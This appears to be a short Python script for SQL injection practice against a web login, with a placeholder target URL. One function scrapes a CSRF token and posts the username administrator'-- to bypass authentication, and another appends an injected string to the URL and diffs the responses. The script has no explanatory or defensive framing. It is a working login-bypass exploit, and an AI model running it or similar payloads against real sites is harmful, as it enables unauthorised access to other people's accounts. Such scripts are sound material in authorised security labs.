import requests
import difflib
from bs4 import BeautifulSoup

session = requests.Session()

base_url = 'Your url'

def post_injection():
    resp = session.get(base_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    payload = {
        'csrf': csrf_token,
        'username': "administrator'--",
        'password': "test"
    }

    response = session.post(base_url, data=payload)

    print(response.status_code)
    print(response.text)
    print(response.url)
    print(response.history)

def simple_sql_injection():
    url_response = requests.get(base_url)
    text1 = url_response.text.splitlines()

    sql_injection = "sql injection"
    replased = sql_injection.replace(" ","%20")
    injection = base_url+replased
    injection_request = requests.get(injection)
    text2= injection_request.text.splitlines()

    diff = difflib.ndiff(text1, text2)

    for lines in diff:
        if lines.startswith('+'):
            print(lines)

def show_text():
    url_response = requests.get(base_url)
    print(url_response.text)

if __name__ == "__main__":
    show_text()